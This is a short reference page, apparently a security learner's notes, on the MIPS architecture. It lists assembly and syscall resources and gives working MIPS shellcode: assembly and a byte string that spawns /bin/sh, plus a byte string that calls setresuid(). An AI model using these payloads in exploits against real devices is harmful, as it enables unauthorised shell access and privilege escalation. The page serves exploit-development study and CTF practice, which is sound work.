---
title: MIPS
---

## Architecture

### Assembly

- [MIPS Assembly/](https://en.wikibooks.org/wiki/MIPS_Assembly/)
- [MIPS Instruction Set](https://cscie95.dce.harvard.edu/fall2023/slides/MIPS%20Instruction%20Set.pdf)

### Syscalls

- [Linux kernel syscall tables](https://syscalls.mebeim.net/)

## Shellcodes

### `exec /bin/sh`

```asm {linenos=table}
lui $t7, 0x2f2f
ori $t7, $t7,0x6269
lui $t6, 0x6e2f
ori $t6, $t6, 0x7368
sw $t7, -12($sp)
sw $t6, -8($sp)
sw $zero, -4($sp)
addiu $a0, $sp, -12
slti $a1, $zero, -1
slti $a2, $zero, -1
li $v0, 4011
syscall 0x040405
```

```python
"\x3c\x0f\x2f\x2f\x35\xef\x62\x69\x3c\x0e\x6e\x2f\x35\xce\x73\x68\xaf\xaf\xff\xf4\xaf\xae\xff\xf8\xaf\xa0\xff\xfc\x27\xa4\xff\xf4\x28\x05\xff\xff\x28\x06\xff\xff\x24\x02\x0f\xab\x01\x01\x01\x4c"
```

### `setresuid()`

```python
"\x34\x02\x0f\xd1\x01\x01\x01\x0c\xaf\xa2\xff\xfc\x8f\xa4\xff\xfc\xaf\xa2\xff\xfc\x8f\xa5\xff\xfc\xaf\xa2\xff\xfc\x8f\xa6\xff\xfc\x34\x02\x10\x59\x01\x01\x01\x0c"
```


## Resources

- [Wikipedia - MIPS architecture](https://en.wikipedia.org/wiki/MIPS_architecture)
- [Writing a shellcode for MIPS32](https://fireshellsecurity.team/writing-a-shellcode-for-mips32/)
- [MIPS_Green_Sheet.pdf](https://github.com/jamesminardi/mips-pipeline-processor/blob/main/MIPS_Green_Sheet.pdf)
